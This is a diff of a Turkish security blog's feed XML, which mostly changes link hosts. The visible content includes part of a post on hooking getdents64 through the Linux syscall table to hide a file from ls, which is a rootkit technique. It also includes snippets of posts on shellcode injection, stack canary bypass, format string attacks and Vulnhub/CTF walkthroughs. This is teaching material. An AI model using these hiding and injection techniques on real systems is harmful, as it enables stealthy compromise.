+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;make&lt;/strong&gt; komutunu çalıştırıp derledikten sonra çıktımız :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# make
+make -C /lib/modules/4.4.0-78-generic/build M=/root/hey modules
+make[1]: Entering directory `/usr/src/linux-headers-4.4.0-78-generic'
+  CC [M]  /root/hey/syscallhook.o
+/root/hey/syscallhook.c: In function ‘hook_getdents64’:
+/root/hey/syscallhook.c:36:21: warning: assignment from incompatible pointer type [enabled by default]
+                 cur = (struct linux_dirent*) ((char*)dirp + i);
+                     ^
+/root/hey/syscallhook.c: In function ‘getdents_hook_init’:
+/root/hey/syscallhook.c:63:3: warning: passing argument 1 of ‘set_page_rw’ makes integer from pointer without a cast [enabled by default]
+   set_page_rw(sys_call_table);
+   ^
+/root/hey/syscallhook.c:41:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
+ int set_page_rw(unsigned long addr)
+     ^
+/root/hey/syscallhook.c: In function ‘getdents_hook_exit’:
+/root/hey/syscallhook.c:71:3: warning: passing argument 1 of ‘set_page_ro’ makes integer from pointer without a cast [enabled by default]
+   set_page_ro(sys_call_table);
+   ^
+/root/hey/syscallhook.c:49:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
+ int set_page_ro(unsigned long addr)
+     ^
+/root/hey/syscallhook.c:72:9: warning: ‘return’ with a value, in function returning void [enabled by default]
+         return 0;
+         ^
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /root/hey/syscallhook.mod.o
+  LD [M]  /root/hey/syscallhook.ko
+make[1]: Leaving directory `/usr/src/linux-headers-4.4.0-78-generic'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘mizi derledikten sonra şimdi sıra geldi &lt;strong&gt;ls&lt;/strong&gt; komutundan kaçıracağımız baştada belirttiğimiz dosya ismini oluşturmaya :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# touch cokgizlidosya.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bundan sonrası ziyafet. Şimdi oluşturduğumuz modülü kernel içerisine &lt;strong&gt;insmod&lt;/strong&gt; komutu ile aktaralım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# insmod ./syscallhook.ko
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Modülü yüklemeden önce &lt;strong&gt;ls&lt;/strong&gt; komutunun bulduğu dosyalar :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# ls
+cokgizlidosya.txt  Module.symvers  syscallhook.mod.c
+Makefile           syscallhook.c   syscallhook.mod.o
+modules.order      syscallhook.ko  syscallhook.o
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Modülü yükledikten sonra &lt;strong&gt;ls&lt;/strong&gt; komutunun bulduğu dosyalar :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# ls
+Makefile       Module.symvers  syscallhook.ko     syscallhook.mod.o
+modules.order  syscallhook.c   syscallhook.mod.c  syscallhook.o
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Gördüğünüz gibi &lt;strong&gt;ls&lt;/strong&gt; komutundan &lt;strong&gt;cokgizlidosya.txt&lt;/strong&gt; dosyamızı gizlemeyi &lt;strong&gt;System Call Table&lt;/strong&gt; içerisindeki &lt;strong&gt;ls&lt;/strong&gt; komutunun kullandığı sistem çağrılarını hook ederek başardık.&lt;/p&gt;
+
+&lt;p&gt;Bu modülü silip herşeyi eski haline çevirmek için :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# rmmod syscallhook
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ve bu yazının da sonunda geldik. Umarım açıklayıcı anlatabilmişimdir.&lt;/p&gt;
+
+&lt;p&gt;Sorular için twitter hesabım : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux System Call Hooking</summary></entry><entry><title type="html">Process Shellcode Injection</title><link href="http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection.html" rel="alternate" type="text/html" title="Process Shellcode Injection" /><published>2019-04-28T00:00:00+03:00</published><updated>2019-04-28T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection.html">&lt;h3 id=&quot;process-shellcode-injection&quot;&gt;Process Shellcode Injection&lt;/h3&gt;
 
 &lt;p&gt;Merhaba arkadaşlar yeni yazıma hoşgeldiniz.&lt;/p&gt;
 
@@ -168,7 +549,7 @@
 
 &lt;p&gt;&lt;a href=&quot;https://youtu.be/oaNvWM9k84g&quot;&gt;Demo Video&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Yazı hakkında aklınızda soru işareti varsa twitter hesabım : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Process Shellcode Injection</summary></entry><entry><title type="html">Loadable Kernel Module Development</title><link href="http://192.168.0.104:4000/2019/04/22/loadable-kernel-module.html" rel="alternate" type="text/html" title="Loadable Kernel Module Development" /><published>2019-04-22T00:00:00+03:00</published><updated>2019-04-22T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2019/04/22/loadable-kernel-module</id><content type="html" xml:base="http://192.168.0.104:4000/2019/04/22/loadable-kernel-module.html">&lt;h1 id=&quot;loadable-kernel-module-lkm&quot;&gt;Loadable Kernel Module (LKM)&lt;/h1&gt;
+&lt;p&gt;Yazı hakkında aklınızda soru işareti varsa twitter hesabım : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Process Shellcode Injection</summary></entry><entry><title type="html">Loadable Kernel Module Development</title><link href="http://192.168.254.251:4000/2019/04/22/loadable-kernel-module.html" rel="alternate" type="text/html" title="Loadable Kernel Module Development" /><published>2019-04-22T00:00:00+03:00</published><updated>2019-04-22T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/22/loadable-kernel-module</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/22/loadable-kernel-module.html">&lt;h1 id=&quot;loadable-kernel-module-lkm&quot;&gt;Loadable Kernel Module (LKM)&lt;/h1&gt;
 
 &lt;p&gt;Merhaba arkadaşlar. &lt;strong&gt;Loadable Kernel Module (LKM)&lt;/strong&gt; yazıma hoşgeldiniz.&lt;/p&gt;
 
@@ -322,7 +703,7 @@ remnux@remnux:~/heyhey$
 
 &lt;p&gt;Bir daha ki yazımda büyük ihtimal &lt;strong&gt;sys_call_table hijacking&lt;/strong&gt; anlatacağım.&lt;/p&gt;
 
-&lt;p&gt;Sonra ki yazılarda da artık bir rootkit yazarız diye düşünüyorum. Kendinize iyi bakın görüşmek dileği ile !&lt;/p&gt;</content><author><name></name></author><summary type="html">Loadable Kernel Module (LKM)</summary></entry><entry><title type="html">Linux Function Hooking</title><link href="http://192.168.0.104:4000/2019/04/14/Linux-Function-Hooking.html" rel="alternate" type="text/html" title="Linux Function Hooking" /><published>2019-04-14T00:00:00+03:00</published><updated>2019-04-14T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2019/04/14/Linux-Function-Hooking</id><content type="html" xml:base="http://192.168.0.104:4000/2019/04/14/Linux-Function-Hooking.html">&lt;h1 id=&quot;linux-load-time-function-hooking&quot;&gt;Linux Load-Time Function Hooking&lt;/h1&gt;
+&lt;p&gt;Sonra ki yazılarda da artık bir rootkit yazarız diye düşünüyorum. Kendinize iyi bakın görüşmek dileği ile !&lt;/p&gt;</content><author><name></name></author><summary type="html">Loadable Kernel Module (LKM)</summary></entry><entry><title type="html">Linux Function Hooking</title><link href="http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking.html" rel="alternate" type="text/html" title="Linux Function Hooking" /><published>2019-04-14T00:00:00+03:00</published><updated>2019-04-14T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/14/Linux-Function-Hooking.html">&lt;h1 id=&quot;linux-load-time-function-hooking&quot;&gt;Linux Load-Time Function Hooking&lt;/h1&gt;
 
 &lt;p&gt;Uzun bir süreden sonra bloguma yazı yazıyorum. 2019’un ilk blog yazısı olacak umarım yazıyı beğenirsiniz.&lt;/p&gt;
 
@@ -508,7 +889,7 @@ Yeni mesaj
 remnux@remnux:~/hoq$
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Umarım yazıyı beğenmişsinizdir ve açıklayabilmişimdir &lt;strong&gt;Function Hooking&lt;/strong&gt;, &lt;strong&gt;Load-Time&lt;/strong&gt;, &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; vs.. gibi terimleri. İyi günler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux Load-Time Function Hooking</summary></entry><entry><title type="html">Stack Canary Bypass</title><link href="http://192.168.0.104:4000/2018/11/17/Stack-Canary-Bypass.html" rel="alternate" type="text/html" title="Stack Canary Bypass" /><published>2018-11-17T00:00:00+03:00</published><updated>2018-11-17T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2018/11/17/Stack-Canary-Bypass</id><content type="html" xml:base="http://192.168.0.104:4000/2018/11/17/Stack-Canary-Bypass.html">&lt;p&gt;Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : &lt;a href=&quot;https://www.youtube.com/watch?v=sWKxjoZKhx4&amp;amp;t=845s&quot;&gt;Video&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Umarım yazıyı beğenmişsinizdir ve açıklayabilmişimdir &lt;strong&gt;Function Hooking&lt;/strong&gt;, &lt;strong&gt;Load-Time&lt;/strong&gt;, &lt;strong&gt;LD_PRELOAD&lt;/strong&gt; vs.. gibi terimleri. İyi günler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux Load-Time Function Hooking</summary></entry><entry><title type="html">Stack Canary Bypass</title><link href="http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass.html" rel="alternate" type="text/html" title="Stack Canary Bypass" /><published>2018-11-17T00:00:00+03:00</published><updated>2018-11-17T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass</id><content type="html" xml:base="http://192.168.254.251:4000/2018/11/17/Stack-Canary-Bypass.html">&lt;p&gt;Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : &lt;a href=&quot;https://www.youtube.com/watch?v=sWKxjoZKhx4&amp;amp;t=845s&quot;&gt;Video&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;Merhaba arkadaşlar bu blogum da sizlere standart güvenlik önlemlerinden biri olan &lt;strong&gt;Stack Canary&lt;/strong&gt; yani bir diğer adı ile de &lt;strong&gt;Stack Cookie&lt;/strong&gt;‘sinin nasıl bypass edileceğinden bahsedeceğim. Kafanız da güvenlik önemleri terimine ait bir yapı olmuşması için çoğumuzun bildiği bir kaç güvenlik önleminin ismini vererek yazıma başlamak istiyorum.  &lt;strong&gt;ASLR, NX, RELRO, SafeSEH, DEP&lt;/strong&gt; ve benzerleri… “Stack Canary” gibi güvenlik önlemleridir. Derleyiciniz ile bunları belirleyip işleme geçirebilirsiniz. Ya da işletim sisteminizi bunu otomatik belirlemesi için ayarlaya bilirsiniz.&lt;/p&gt;
 
@@ -736,11 +1117,11 @@ Aborted (core dumped)
 
 &lt;p&gt;&lt;strong&gt;GDB&lt;/strong&gt; içerisin de yukarıdaki adımları takip etmeniz çok önemli.&lt;/p&gt;
 
-&lt;p&gt;Okuduğunuz için çok teşekkürler umarım yardımcı olabilmişimdir. Sorularınız varsa veya herhangi bir hata gördüyseniz lütfen bana twitter hesabım olan @0DAYanc’tan yazmaya çekinmeyin. Bir Sonraki Yazıda Görüşmek Üzere !&lt;/p&gt;</content><author><name></name></author><summary type="html">Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : Video</summary></entry><entry><title type="html">PE Code Injection</title><link href="http://192.168.0.104:4000/2018/10/26/pe-code-injection.html" rel="alternate" type="text/html" title="PE Code Injection" /><published>2018-10-26T00:00:00+03:00</published><updated>2018-10-26T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2018/10/26/pe-code-injection</id><content type="html" xml:base="http://192.168.0.104:4000/2018/10/26/pe-code-injection.html">&lt;p&gt;Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :&lt;/p&gt;
+&lt;p&gt;Okuduğunuz için çok teşekkürler umarım yardımcı olabilmişimdir. Sorularınız varsa veya herhangi bir hata gördüyseniz lütfen bana twitter hesabım olan @0DAYanc’tan yazmaya çekinmeyin. Bir Sonraki Yazıda Görüşmek Üzere !&lt;/p&gt;</content><author><name></name></author><summary type="html">Yazımıza geçmeden önce ben videodan daha iyi öğrenirim diyen arkadaşlar için youtube’da çektiğim videoya alalım sizleri : Video</summary></entry><entry><title type="html">PE Code Injection</title><link href="http://192.168.254.251:4000/2018/10/26/pe-code-injection.html" rel="alternate" type="text/html" title="PE Code Injection" /><published>2018-10-26T00:00:00+03:00</published><updated>2018-10-26T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/10/26/pe-code-injection</id><content type="html" xml:base="http://192.168.254.251:4000/2018/10/26/pe-code-injection.html">&lt;p&gt;Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=w4tioqtw2pM&quot;&gt;PE Code Injection&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Kısa bilgi : Video kayıdına aldığım bu konu basit şekilde PE(Portable Executable) çalıştırılabilir (Win 32/64 bit) .exe dosyalarının biraz analizini &amp;amp; tam anlamı ilede içerisine kod enjeksiyonunun(Code Injection) yapılmasını anlattım. İyi izlemeler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :</summary></entry><entry><title type="html">Format String Attack</title><link href="http://192.168.0.104:4000/2018/10/17/format-string-attack.html" rel="alternate" type="text/html" title="Format String Attack" /><published>2018-10-17T00:00:00+03:00</published><updated>2018-10-17T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2018/10/17/format-string-attack</id><content type="html" xml:base="http://192.168.0.104:4000/2018/10/17/format-string-attack.html">&lt;h1 id=&quot;format-string-nedir-&quot;&gt;&lt;strong&gt;Format String Nedir ?&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Kısa bilgi : Video kayıdına aldığım bu konu basit şekilde PE(Portable Executable) çalıştırılabilir (Win 32/64 bit) .exe dosyalarının biraz analizini &amp;amp; tam anlamı ilede içerisine kod enjeksiyonunun(Code Injection) yapılmasını anlattım. İyi izlemeler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :</summary></entry><entry><title type="html">Format String Attack</title><link href="http://192.168.254.251:4000/2018/10/17/format-string-attack.html" rel="alternate" type="text/html" title="Format String Attack" /><published>2018-10-17T00:00:00+03:00</published><updated>2018-10-17T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/10/17/format-string-attack</id><content type="html" xml:base="http://192.168.254.251:4000/2018/10/17/format-string-attack.html">&lt;h1 id=&quot;format-string-nedir-&quot;&gt;&lt;strong&gt;Format String Nedir ?&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;em&gt;Format string metin ve format parametreleri tutan bir ASCII’dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini  direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.&lt;/em&gt;&lt;/p&gt;
 
 &lt;p&gt;Format Stringleri içeren tablo:&lt;/p&gt;
@@ -877,7 +1258,7 @@ Başta da memoryi leak etmemizi sağlayan “%x” format stringini hatırlıyor
 
 &lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/3/printf&quot;&gt;Man page&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Printf_format_string&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Format String Nedir ? Format string metin ve format parametreleri tutan bir ASCII’dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.</summary></entry><entry><title type="html">Spanning Tree Protocol(STP) Saldırı ve Korunma Yöntemleri</title><link href="http://192.168.0.104:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri.html" rel="alternate" type="text/html" title="Spanning Tree Protocol(STP) Saldırı ve Korunma Yöntemleri" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri</id><content type="html" xml:base="http://192.168.0.104:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri.html">&lt;h1 id=&quot;spanning-tree-protocol-stp-nedir--&quot;&gt;Spanning Tree Protocol (STP) nedir ? :&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Printf_format_string&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Format String Nedir ? Format string metin ve format parametreleri tutan bir ASCII’dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.</summary></entry><entry><title type="html">Spanning Tree Protocol(STP) Saldırı ve Korunma Yöntemleri</title><link href="http://192.168.254.251:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri.html" rel="alternate" type="text/html" title="Spanning Tree Protocol(STP) Saldırı ve Korunma Yöntemleri" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri</id><content type="html" xml:base="http://192.168.254.251:4000/2017/12/07/spanning-tree-protocolstp-saldiri-ve-korunma-yontemleri.html">&lt;h1 id=&quot;spanning-tree-protocol-stp-nedir--&quot;&gt;Spanning Tree Protocol (STP) nedir ? :&lt;/h1&gt;
 
 &lt;p&gt;Switching loops yani anahtarlama döngülerini engellemek için geliştirilmiş &lt;a href=&quot;https://en.wikipedia.org/wiki/OSI_model&quot; target=&quot;_blank&quot;&gt;OSI Model’inde&lt;/a&gt; bulunan &lt;strong&gt;ikinci katman(layer 2)&lt;/strong&gt; içerisinde bulunan bir protokol’dur.&lt;/p&gt;
 
@@ -959,7 +1340,7 @@ Başta da memoryi leak etmemizi sağlayan “%x” format stringini hatırlıyor
 &lt;strong&gt;BPDU Root Koruması&lt;/strong&gt; :&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Router#spanning-tree rootguard
 &lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;</content><author><name></name></author><summary type="html">Spanning Tree Protocol (STP) nedir ? :</summary></entry><entry><title type="html">Mr-Robot Vulnhub - Walktrough</title><link href="http://192.168.0.104:4000/2017/12/07/mr-robot-vulnhub-walktrough.html" rel="alternate" type="text/html" title="Mr-Robot Vulnhub - Walktrough" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2017/12/07/mr-robot-vulnhub-walktrough</id><content type="html" xml:base="http://192.168.0.104:4000/2017/12/07/mr-robot-vulnhub-walktrough.html">&lt;p&gt;Merhaba arkadaşım.Görüşmeyeli uzun süre oldu :D&lt;br /&gt;
+&lt;/div&gt;</content><author><name></name></author><summary type="html">Spanning Tree Protocol (STP) nedir ? :</summary></entry><entry><title type="html">Mr-Robot Vulnhub - Walktrough</title><link href="http://192.168.254.251:4000/2017/12/07/mr-robot-vulnhub-walktrough.html" rel="alternate" type="text/html" title="Mr-Robot Vulnhub - Walktrough" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2017/12/07/mr-robot-vulnhub-walktrough</id><content type="html" xml:base="http://192.168.254.251:4000/2017/12/07/mr-robot-vulnhub-walktrough.html">&lt;p&gt;Merhaba arkadaşım.Görüşmeyeli uzun süre oldu :D&lt;br /&gt;
 &lt;br /&gt;
 neyse yazımıza geçelim.&lt;/p&gt;
 
@@ -1098,7 +1479,7 @@ sistemde / dizinine geçip : find / -name “key-3-of3.txt”&lt;/p&gt;
 &lt;br /&gt;
 ve son flagimizide böylelikle buluyoruz. : 04787ddef27c3dee1ee161b21670b4e4&lt;/p&gt;
 
-&lt;p&gt;bir dahaki yazımda görüşürüz :)&lt;/p&gt;</content><author><name></name></author><summary type="html">Merhaba arkadaşım.Görüşmeyeli uzun süre oldu :D neyse yazımıza geçelim.</summary></entry><entry><title type="html">Hackfest2016: Quaoar - Walkthrough</title><link href="http://192.168.0.104:4000/2017/12/07/hackfest2016-quaoar-walkthrough.html" rel="alternate" type="text/html" title="Hackfest2016: Quaoar - Walkthrough" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2017/12/07/hackfest2016-quaoar-walkthrough</id><content type="html" xml:base="http://192.168.0.104:4000/2017/12/07/hackfest2016-quaoar-walkthrough.html">&lt;h1 style=&quot;color:red;&quot;&gt;Bu yazı içerisindeki fotoraflar imgur.com sitesine yüklüdür ve bu site türkiyede engellidir fotorafları görmek için proxy kullanınız !&lt;/h1&gt;
+&lt;p&gt;bir dahaki yazımda görüşürüz :)&lt;/p&gt;</content><author><name></name></author><summary type="html">Merhaba arkadaşım.Görüşmeyeli uzun süre oldu :D neyse yazımıza geçelim.</summary></entry><entry><title type="html">Hackfest2016: Quaoar - Walkthrough</title><link href="http://192.168.254.251:4000/2017/12/07/hackfest2016-quaoar-walkthrough.html" rel="alternate" type="text/html" title="Hackfest2016: Quaoar - Walkthrough" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2017/12/07/hackfest2016-quaoar-walkthrough</id><content type="html" xml:base="http://192.168.254.251:4000/2017/12/07/hackfest2016-quaoar-walkthrough.html">&lt;h1 style=&quot;color:red;&quot;&gt;Bu yazı içerisindeki fotoraflar imgur.com sitesine yüklüdür ve bu site türkiyede engellidir fotorafları görmek için proxy kullanınız !&lt;/h1&gt;
 
 &lt;p&gt;Yeniden merhaba uzun bir süredir blog yazmıyordum yine google botlarına ayıp olmasın ve geride okuyabileceğim birşeyler bırakayım diye çözdüğüm vulnhub’u paylaşmak istedim.&lt;/p&gt;
 
@@ -1192,821 +1573,4 @@ ve son flagimizide böylelikle buluyoruz. : 04787ddef27c3dee1ee161b21670b4e4&lt;
 
 &lt;p&gt;2.Flag : 8e3f9ec016e3598c5eec11fd3d73f6fb&lt;/p&gt;
 
-&lt;p&gt;Google botlarına teşekkürler iyi günler :)&lt;/p&gt;</content><author><name></name></author><summary type="html">Bu yazı içerisindeki fotoraflar imgur.com sitesine yüklüdür ve bu site türkiyede engellidir fotorafları görmek için proxy kullanınız !</summary></entry><entry><title type="html">CTF Canyoupwn.me Çözümleri</title><link href="http://192.168.0.104:4000/2017/12/07/ctf-canyoupwnme-cozumleri.html" rel="alternate" type="text/html" title="CTF Canyoupwn.me Çözümleri" /><published>2017-12-07T00:00:00+03:00</published><updated>2017-12-07T00:00:00+03:00</updated><id>http://192.168.0.104:4000/2017/12/07/ctf-canyoupwnme-cozumleri</id><content type="html" xml:base="http://192.168.0.104:4000/2017/12/07/ctf-canyoupwnme-cozumleri.html">&lt;p&gt;Merhaba arkadaşlar yine 3,4 hafta MR. ROBOT walktrough’tan sonra hiç birşey yazmadım onun telafisi ve google botlarına ayıp olmasın diye ctf.canyoupwn.me’nin hazırladığı çözdüğüm tüm ctf sorularının nasıl çözüldüğünü anlatan bir blog olacak bu.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-wQAdvE_ktCk/WS-7LC4CjSI/AAAAAAAAAoc/r6plFtC2wmMY17U0BV6HoXBZGfC8r-YPQCLcB/s1600/Screenshot_7.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;514&quot; data-original-width=&quot;1041&quot; height=&quot;158&quot; src=&quot;https://4.bp.blogspot.com/-wQAdvE_ktCk/WS-7LC4CjSI/AAAAAAAAAoc/r6plFtC2wmMY17U0BV6HoXBZGfC8r-YPQCLcB/s320/Screenshot_7.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Şuan 8.’yim ctf leader board’ında.&lt;br /&gt;
-&lt;br /&gt;
-Toplam’da 58 soru çözdüm diğer soruları çözersem eklemeye devam edeceğim.&lt;br /&gt;
-&lt;br /&gt;
-ilk olarak bize 10 puan veren ve flaglerin nasıl yazılacağını gösteren bir forum var.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-iRmkXYsyWeA/WSobcVui1rI/AAAAAAAAAag/VoltzzNtzZ41LoM-GYSZIKNnbblstcOMwCLcB/s1600/Screenshot_2.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;450&quot; data-original-width=&quot;603&quot; height=&quot;238&quot; src=&quot;https://1.bp.blogspot.com/-iRmkXYsyWeA/WSobcVui1rI/AAAAAAAAAag/VoltzzNtzZ41LoM-GYSZIKNnbblstcOMwCLcB/s320/Screenshot_2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Soruların çözümüne geçmeden önce canyoupwn.me ekibinin eline sağlık böyle güzel bir capture the flag projesini bize sundukları için.Bazı sorular bizi dertlendirdi(Gerçek anlamda kayahan şarkısı felan :D) bazı sorularda eğlendirdi şarkılarıyla.Çok güzel bir yarışma olmuş.Grafikleri ayrıca beğendim.&lt;br /&gt;
-&lt;br /&gt;
-Şimdi sorularımıza geçme zamanı Alttan üste doğru tüm çözümleri anlatmayı planlıyorum.&lt;br /&gt;
-Başlayalım.&lt;br /&gt;
-&lt;br /&gt;
